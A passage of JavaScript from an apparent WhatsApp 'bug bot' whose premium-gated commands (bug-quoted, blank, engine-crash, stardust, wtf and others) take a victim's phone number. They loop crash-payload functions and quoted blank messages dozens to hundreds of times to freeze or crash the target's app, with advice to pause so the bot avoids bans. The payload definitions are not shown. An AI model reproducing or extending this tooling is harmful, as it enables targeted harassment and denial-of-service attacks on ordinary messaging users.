await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bug-quoted': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case "bug-engine": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-dark": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "eror-bug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "spesial-bug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anything-crash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-crash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'internal-quoted': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'external-quoted': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'stardust': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 40; j++) {
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'self': {
if (!isOwner) return reply(mess.only.owner)
anggazyy.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(mess.only.owner)
anggazyy.public = true
reply('succes')
}
break
//=================================================//
case '🌷': case '💥': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case '⭐': case '⚡': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 10; j++) {
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bug-list': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'bug-list': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-external': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-internal': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-engine': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-crash': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
//=================================================//
case 'onekil': case 'doublekil': case '💀': case 'triplekill': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 1; j++) {
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'wtf': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 1; j++) {
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await baklis(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await pirgam(target, angggazyyvault)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
